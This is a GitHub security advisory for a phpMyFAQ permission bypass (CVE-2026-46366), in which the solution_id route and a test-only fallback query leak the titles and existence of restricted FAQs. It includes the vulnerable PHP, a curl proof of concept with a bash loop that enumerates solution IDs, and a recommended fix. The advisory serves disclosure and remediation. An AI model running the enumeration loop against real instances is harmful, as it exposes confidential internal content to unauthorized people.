# [H] phpMyFAQ has unauthenticated FAQ permission bypass via getFaqBySolutionId fallback query

## Summary
Severity: High
Advisory: GHSA-99qv-g4x9-mgc3
CVE: CVE-2026-46366
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-99qv-g4x9-mgc3
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

The public `/solution_id_{id}.html` route calls `Faq::getIdFromSolutionId()` in `phpmyfaq/src/phpMyFAQ/Faq.php:1312`. That query joins `faqdata` with `faqcategoryrelations` solely by `solution_id` and returns the matching FAQ's `id`, `lang`, `thema` (title), and `category_id` with no permission filter. An unauthenticated visitor hits the route with a sequential integer and the server 301-redirects to `/content/<category>/<id>/<lang>/<title-slug>.html`, leaking the FAQ's existence, internal id, language, category binding, and title via the redirect's `Location` header and the redirected page's canonical link, share-to-social URLs, and hidden form fields. The related `getFaqBySolutionId()` at line 1221 contains an explicit fallback query (added "for tests") that also bypasses the permission filter, widening the blast radius to any callsite that trusts its result.

## Details

### The sink: `getIdFromSolutionId()` has no permission filter

`phpmyfaq/src/phpMyFAQ/Faq.php:1312`:

```php
public function getIdFromSolutionId(int $solutionId): array
{
    $query = sprintf(
        'SELECT fd.id, fd.lang, fd.thema AS question, fd.content, fcr.category_id
         FROM %sfaqdata fd
         LEFT JOIN %sfaqcategoryrelations fcr
           ON fd.id = fcr.record_id AND fd.lang = fcr.record_lang
         WHERE fd.solution_id = %d',
        Database::getTablePrefix(),
        Database::getTablePrefix(),
        $solutionId,
    );
    // ...
}
```

No `WHERE`-clause permission filter, no group/user filter. Every callsite that trusts this method exposes restricted FAQs. The route at `phpmyfaq/src/phpMyFAQ/Controller/Frontend/FaqController.php:172` uses this result to compute a slugified URL and 301-redirects to it:

```php
#[Route(path: '/solution_id_{solutionId}.html', name: 'public.faq.solution', methods: ['GET'])]
public function solution(Request $request): Response
{
    $solutionId = Filter::filterVar($request->attributes->get('solutionId'), FILTER_VALIDATE_INT, 0);
    // ...
    $faqData = $this->faq->getIdFromSolutionId($solutionId);
    if ($faqData === []) {
        return new Response('', Response::HTTP_NOT_FOUND);
    }
    $slug = TitleSlugifier::slug($faqData['question']);
    $url = sprintf('/content/%d/%d/%s/%s.html',
        $faqData['category_id'], $faqData['id'], $faqData['lang'], $slug);
    return new RedirectResponse($url, Response::HTTP_MOVED_PERMANENTLY);
}
```

The redirect URL embeds the title slug, so an unauthenticated visitor observes the title directly even though the canonical `/content/<...>.html` page may deny rendering the body.

### Related sink: `getFaqBySolutionId()` explicitly falls back without the filter

`phpmyfaq/src/phpMyFAQ/Faq.php:1256-1265`:

```php
if (false === $row || null === $row) {
    // Fallback without permission filter to ensure retrieval in non-authenticated contexts (e.g., tests)
    $fallbackQuery = sprintf(
        'SELECT * FROM %sfaqdata fd WHERE fd.solution_id = %d LIMIT 1',
        Database::getTablePrefix(),
        $solutionId,
    );
    $fallbackResult = $this->configuration->getDb()->query($fallbackQuery);
    $row = $this->configuration->getDb()->fetchObject($fallbackResult);
}
```

The inline comment confirms the fallback was introduced for test convenience. In production, the fallback fires exactly when the permission-filtered query returns zero rows (because the caller is unauthenticated or lacks group/user permission) and populates every field of `faqRecord`, including `content`, `keywords`, `author`, `email`, and `notes`. Downstream consumers that expect `faqRecord` to respect ACLs no longer do.

### Entry enumeration

Solution IDs are monotonically increasing integers (`faqdata.solution_id`). An attacker enumerates `/solution_id_<n>.html` from 1 upward and records every non-404 response to discover the full set of FAQs on the instance, including ones restricted to admin-only groups or specific users.

## Proof of Concept

Prerequisites: a phpMyFAQ instance has at least one FAQ record restricted to a specific user or group via `faqdata_user` / `faqdata_group`. Note its `solution_id`, which is assigned sequentially starting from a six-digit base.

Step 1. Anonymous GET of the solution URL:

```bash
curl -sS -L -o /tmp/out.html -w 'HTTP %{http_code}\n' \
  'http://<host>/solution_id_<restricted-solution-id>.html'
```

Step 2. Observe the 301 redirect that `getIdFromSolutionId()` returns. The `Location` header carries the slugified title of the restricted FAQ directly in the URL path:

```
HTTP/1.1 301 Moved Permanently
Location: /content/<category-id>/<record-id>/<lang>/<title-slug>.html
```

Step 3. The redirected content page embeds the same metadata in client-controlled sinks, even when the body rendering is suppressed by a separate permission check:

```html
<link rel="canonical" href="http://<host>/content/<category-id>/<record-id>/<lang>/<title-slug>.html">
<input type="hidden" name="voting-id" value="<record-id>">
<a href="http://<host>/pdf/<category-id>/<record-id>/<lang>">...</a>
```

Step 4. Enumerate solution IDs to discover every FAQ on the instance, including those the permission model intended to hide:

```bash
for id in $(seq 1 100000); do
  code=$(curl -sS -o /dev/null -w '%{http_code}' "http://<host>/solution_id_${id}.html")
  if [ "$code" = "301" ]; then
    loc=$(curl -sSI "http://<host>/solution_id_${id}.html" | awk -F': ' '/^Location:/{print $2}' | tr -d '\r')
    echo "solution_id=${id} -> ${loc}"
  fi
done
```

Each `301` response's `Location` header reveals category, id, language, and title of a FAQ whose existence the permission model meant to hide.

## Impact

Any unauthenticated visitor discovers the full set of FAQ entries on the instance, including the subset restricted to specific groups or users, and reads the title of every restricted FAQ. Deployments that use phpMyFAQ to host internal-only content alongside public content (staff knowledge bases, internal SOPs, confidential customer notes) lose the confidentiality of titles and of the fact that those FAQs exist. Slugified titles often encode the subject directly (for example `q3-layoff-plan`, `aws-root-key-rotation`), so the title alone can be sensitive.

The body content is usually still served through a separate permission-enforcing path on the canonical `/content/<...>.html` URL, so full-body disclosure requires the caller to also defeat that path (for example by combining with a session from any low-privilege account). The title-plus-existence leak is sufficient on its own to harm confidentiality in deployments where titles encode what the FAQ is about.

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (Medium, 5.3). CWE-863.

## Recommended Fix

Add a permission filter to `getIdFromSolutionId()` the same way `getFaqBySolutionId()` builds one for its primary query (using `QueryHelper::queryPermission()`):

```php
public function getIdFromSolutionId(int $solutionId): array
{
    $queryHelper = new QueryHelper($this->user, $this->groups);
    $query = sprintf(
        'SELECT fd.id, fd.lang, fd.thema AS question, fd.content, fcr.category_id
         FROM %sfaqdata fd
         LEFT JOIN %sfaqcategoryrelations fcr
           ON fd.id = fcr.record_id AND fd.lang = fcr.record_lang
         LEFT JOIN (
             SELECT record_id, group_id FROM %sfaqdata_group fdg WHERE fdg.group_id <> -1
             UNION ALL
             SELECT fd.id AS record_id, -1 AS group_id FROM %sfaqdata fd WHERE fd.solution_id = %d
         ) AS fdg ON fd.id = fdg.record_id
         LEFT JOIN %sfaqdata_user fdu ON fd.id = fdu.record_id
         WHERE fd.solution_id = %d %s',
        Database::getTablePrefix(),
        Database::getTablePrefix(),
        Database::getTablePrefix(),
        Database::getTablePrefix(),
        $solutionId,
        Database::getTablePrefix(),
        $solutionId,
        $queryHelper->queryPermission($this->groupSupport),
    );
    // ...
}
```

Separately, remove the unconditional fallback in `getFaqBySolutionId()` at `Faq.php:1256-1265`. If the permission-filtered query returns no rows, the FAQ is not visible to this caller; the method should leave `faqRecord` empty rather than re-query without the filter. If tests rely on the old behavior, replace the production fallback with a dedicated test helper or a flag that is disabled outside test bootstrap.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-99qv-g4x9-mgc3
- https://nvd.nist.gov/vuln/detail/CVE-2026-46366
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-unauthenticated-information-disclosure-via-getidfromsolutionid-permission-bypass
